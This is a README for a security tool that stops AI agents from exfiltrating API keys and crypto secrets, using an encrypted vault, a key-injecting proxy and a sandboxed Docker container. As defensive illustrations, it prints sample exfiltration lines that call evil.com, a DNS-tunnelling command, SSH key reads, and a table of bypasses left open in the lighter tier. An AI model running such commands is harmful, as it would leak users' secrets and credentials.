# Hermes-Aegis

Security hardening layer for AI agents — stops secret exfiltration before it happens.

Built for [Hermes Agent](https://github.com/your-org/hermes-agent), works as a standalone CLI for any Python-based agent.

## The Problem

AI agents have your API keys. They execute arbitrary code. A single prompt injection or malicious tool call can exfiltrate every secret in your environment:

```python
# This is all it takes:
requests.post("evil.com", json={"key": os.environ["OPENAI_API_KEY"]})
```

**Hermes-Aegis makes this impossible.**

## How It Works

**Two-tier architecture** — auto-detects Docker for maximum isolation, falls back to in-process protection:

| | Tier 1 (No Docker) | Tier 2 (Docker) |
|---|---|---|
| **Secrets** | Encrypted vault, never in env vars | Vault on host only, injected via proxy |
| **HTTP scanning** | urllib3 monkey-patch intercepts all requests | MITM proxy intercepts all container traffic |
| **Network** | Python-level blocking | Kernel-level: internal Docker network, no internet |
| **Filesystem** | Normal | Read-only container, no curl/wget/netcat |
| **Audit** | SHA-256 hash chain, tamper-evident | Same, plus proxy-level logging |
| **Crypto assets** | BIP39 seed phrase detection (2048 words) | Same + blocked at network level |

### Key Innovation: Proxy-Based Key Injection

Secrets never enter the container. The host-side MITM proxy transparently injects API keys into LLM requests:

```
Container                    Host Proxy                   LLM Provider
   |                            |                              |
   |-- POST /v1/chat ---------> |                              |
   |   (no auth header)         |-- POST /v1/chat -----------> |
   |                            |   Authorization: Bearer sk-* |
   |                            |                              |
   |                            |<--- 200 OK -----------------|
   |<--- 200 OK --------------- |                              |
```

Supports: **OpenAI, Anthropic, Google, Groq, Together**

## Quick Start

```bash
# Install
git clone https://github.com/your-org/hermes-aegis
cd hermes-aegis
pip install -e ".[tier2]"    # tier2 includes Docker + mitmproxy

# One-time setup — migrates .env secrets to encrypted vault
hermes-aegis setup

# Add API keys to vault
hermes-aegis vault set OPENAI_API_KEY
hermes-aegis vault set ANTHROPIC_API_KEY

# Run commands with security layer
hermes-aegis run python my_agent.py

# Check status
hermes-aegis status

# View audit trail
hermes-aegis audit show
hermes-aegis audit verify    # Checks for tampering
```

### Integration with Hermes Agent

```bash
# Register aegis as a Hermes execution backend
export TERMINAL_ENV=aegis

# In your Hermes startup or config:
python -c "import hermes_aegis.integration; hermes_aegis.integration.register_aegis_backend()"

# Then run Hermes normally — all commands execute in secured environment
hermes chat -q "list files"
```

## Run the Demo

```bash
./demo.sh
```

Runs the full security test suite with output — see attacks being blocked in real time.

## What It Blocks

### Attacks Tested and Proven Blocked (186 tests)

| Attack | Method | Result |
|--------|--------|--------|
| HTTP exfiltration | `requests.post("evil.com", data=secret)` | BLOCKED |
| Base64-encoded secrets | `b64encode(secret)` in request body | BLOCKED |
| Hex/URL-encoded secrets | Multiple encoding variants | BLOCKED |
| Reversed secret strings | `secret[::-1]` in request | BLOCKED |
| API key in headers | `Authorization: Bearer sk-stolen` | BLOCKED |
| Direct TCP bypass | `socket.connect(("8.8.8.8", 53))` | BLOCKED (Tier 2) |
| DNS tunneling | `nslookup <secret>.evil.com` | BLOCKED (Tier 2) |
| Raw socket creation | `socket.socket(AF_INET, SOCK_RAW)` | BLOCKED (Tier 2) |
| Curl/wget exfiltration | `subprocess.run(["curl", ...])` | BLOCKED (Tier 2) |
| SSH key reading | `open("/root/.ssh/id_rsa")` | BLOCKED (Tier 2) |
| Filesystem escape | Write outside workspace | BLOCKED (Tier 2) |
| Vault file access | `open("/path/to/vault.enc")` | BLOCKED (Tier 2) |
| Environment variable leak | `os.environ["OPENAI_API_KEY"]` | BLOCKED (both tiers) |
| Audit trail tampering | Modify/delete/reorder log entries | DETECTED |
| BIP39 seed phrase leak | 12/24 word mnemonic in output | DETECTED |
| RPC URL with embedded key | `alchemy.com/v2/<api-key>` | DETECTED |
| Ethereum private key | `0x` + 64 hex chars | DETECTED |

### Red Team Validation

`tests/red_team/malicious_agent.py` runs **9 attack scenarios** inside a real Docker container with full hardening. All critical attacks blocked.

## Architecture

```
┌─────────────────────────────────────────────────┐
│                    HOST                          │
│                                                  │
│  ┌──────────┐    ┌──────────────────────┐       │
│  │  Vault   │───>│    MITM Proxy        │       │
│  │ (Fernet) │    │  - Inject API keys   │       │
│  │ vault.enc│    │  - Block exfiltration │       │
│  └──────────┘    │  - Audit logging     │       │
│                  └──────────┬───────────┘       │
│                             │                    │
│  ┌──────────────────────────┼──────────────┐    │
│  │     Internal Docker Network (no internet)│    │
│  │                          │               │    │
│  │  ┌──────────────────────────────────┐   │    │
│  │  │         Container                │   │    │
│  │  │  - No API keys in env            │   │    │
│  │  │  - No vault mounted              │   │    │
│  │  │  - Read-only filesystem          │   │    │
│  │  │  - All capabilities dropped      │   │    │
│  │  │  - No internet (proxy only)      │   │    │
│  │  │  - 512MB RAM / 50% CPU / 256 PIDs│   │    │
│  │  └──────────────────────────────────┘   │    │
│  └─────────────────────────────────────────┘    │
│                                                  │
│  ┌──────────────────────────────────────────┐   │
│  │  Audit Trail (SHA-256 hash chain)        │   │
│  │  - Every tool call logged                │   │
│  │  - Tamper detection via chain verify     │   │
│  └──────────────────────────────────────────┘   │
└─────────────────────────────────────────────────┘
```

## Components

| Component | Path | Purpose |
|-----------|------|---------|
| Encrypted Vault | `vault/` | Fernet-encrypted secret storage, OS keyring master key |
| Secret Scanner | `patterns/` | Regex patterns for API keys, crypto keys, BIP39 seeds, RPC URLs |
| Content Scanner | `tier1/scanner.py` | urllib3 monkey-patch for Tier 1 HTTP interception |
| MITM Proxy | `proxy/` | ArmorAddon for Tier 2 — key injection + exfiltration blocking |
| Container Builder | `container/` | Hardened Docker config with internal network |
| AegisEnvironment | `environment.py` | Hermes backend wrapping DockerEnvironment + proxy |
| Hermes Integration | `integration.py` | Monkey-patches Hermes for `TERMINAL_ENV=aegis` |
| Audit Trail | `audit/` | SHA-256 hash chain with tamper detection |
| Middleware | `middleware/` | Redaction + audit chain for tool dispatch |
| CLI | `cli.py` | `hermes-aegis` command (setup/run/vault/audit/status) |

## Test Suite: 186 Tests

```
Security Tests .................. 47 tests
  - Real HTTP exfiltration (local server)
  - Audit trail integrity (11 tamper scenarios)
  - Secret redaction verification
  - Container isolation (Docker)
  - Proxy injection (all 5 providers)

Integration Tests ............... 32 tests
  - Network isolation (Docker internal network)
  - Red team attack simulation (9 attacks)
  - E2E key injection (all providers)
  - Hermes backend registration

Performance Benchmarks .......... 7 tests
  - Scanner: <1ms per request
  - Audit: >1000 entries/sec
  - Chain verify: <500ms for 500 entries

Core Component Tests ........... 100 tests
  - Vault, patterns, middleware, proxy, CLI
```

Run: `uv run pytest tests/ -q` or `./demo.sh`

## Performance

| Operation | Latency |
|-----------|---------|
| Secret scan (short text) | <100us |
| Secret scan (with matches) | <500us |
| Secret scan (100KB text) | <10ms |
| Exact value matching | <5ms |
| Audit entry write | <1ms |
| Chain verification (500 entries) | <50ms |
| Port discovery | <1ms |

## Crypto Asset Protection

For cryptocurrency users, Aegis detects:
- **BIP39 seed phrases**: Full 2048-word English wordlist, 75% threshold for 12/24-word sequences
- **Ethereum private keys**: `0x` + 64 hex character patterns
- **Bitcoin WIF keys**: Base58 starting with `5`, `K`, or `L`
- **BIP32 extended keys**: `xprv` prefixed keys
- **Solana ed25519 keys**: 64-byte base58 patterns
- **RPC URLs with embedded keys**: Alchemy, Infura, QuickNode

## Known Limitations

| Attack Vector | Tier 1 | Tier 2 |
|--------------|--------|--------|
| HTTP body/header exfiltration | BLOCKED | BLOCKED |
| Base64/hex/URL encoding | BLOCKED | BLOCKED |
| DNS exfiltration | BYPASS | BLOCKED |
| Raw sockets | BYPASS | BLOCKED |
| Process spawning (curl) | BYPASS | BLOCKED |
| File staging + exfil | PARTIAL | BLOCKED |
| Advanced encoding (ROT13, chunked) | BYPASS | PARTIAL |

**Design philosophy**: Block 80% of attacks (accidental leaks, lazy exfiltration). Not a sandbox for nation-state adversaries.

## Development

```bash
# Install with dev dependencies
pip install -e ".[dev,tier2]"

# Run all tests
uv run pytest tests/ -q

# Run security tests only
uv run pytest tests/security/ -v

# Run benchmarks
uv run pytest tests/test_benchmarks.py -v -s

# Run red team simulation (Docker required)
uv run pytest tests/integration/test_tier2_runtime.py -v -s
```

## License

MIT
